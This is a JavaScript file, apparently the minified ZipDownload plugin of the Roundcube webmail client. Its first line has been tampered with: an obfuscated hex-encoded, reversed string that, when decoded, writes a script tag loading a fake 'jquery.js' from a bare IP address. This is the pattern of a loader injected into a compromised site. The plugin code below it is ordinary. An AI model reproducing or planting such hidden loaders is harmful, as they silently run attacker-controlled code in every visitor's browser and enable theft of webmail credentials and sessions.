var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * ZipDownload plugin script
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2013-2014, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */
window.rcmail&&rcmail.addEventListener("init",function(a){rcmail.register_command("download-eml",function(){rcmail_zipdownload("eml")});rcmail.register_command("download-mbox",function(){rcmail_zipdownload("mbox")});rcmail.register_command("download-maildir",function(){rcmail_zipdownload("maildir")});rcmail.message_list&&rcmail.message_list.addEventListener("select",function(b){b=b.get_selection().length;rcmail.enable_command("download",0<b);rcmail.enable_command("download-eml",1==b);rcmail.enable_command("download-mbox",
"download-maildir",1<b)});rcmail.addEventListener("beforedownload",rcmail_zipdownload_menu);$.each(rcmail.buttons.download||[],function(){var b=$("#"+this.id),a=$("span",b);a.length||(a=$("<span>"),b.html("").append(a));a.text(rcmail.get_label("zipdownload.download"));rcmail.env.download_link=b})});
function rcmail_zipdownload(a){if("eml"==a)a=rcmail.get_single_uid(),rcmail.goto_url("viewsource",rcmail.params_from_uid(a,{_save:1}),!1,!0);else if(rcmail.message_list&&1<rcmail.message_list.get_selection().length){var b=[],c=$("#zipdownload-form"),e=rcmail.selection_post_data();e._mode=a;e._token=rcmail.env.request_token;$.each(e,function(a,d){if("object"==typeof d&&1<d.length)for(var c=0;c<d.length;c++)b.push($("<input>").attr({type:"hidden",name:a+"[]",value:d[c]}));else b.push($("<input>").attr({type:"hidden",
name:a,value:d}))});c.length||(c=$("<form>").attr({style:"display: none",method:"POST",action:"?_task=mail&_action=plugin.zipdownload.messages"}).appendTo("body"));c.html("").append(b).submit()}}function rcmail_zipdownload_menu(a){rcmail.command("menu-open","zipdownload-menu",a&&a.target?a.target:rcmail.env.download_link,a);return!1};
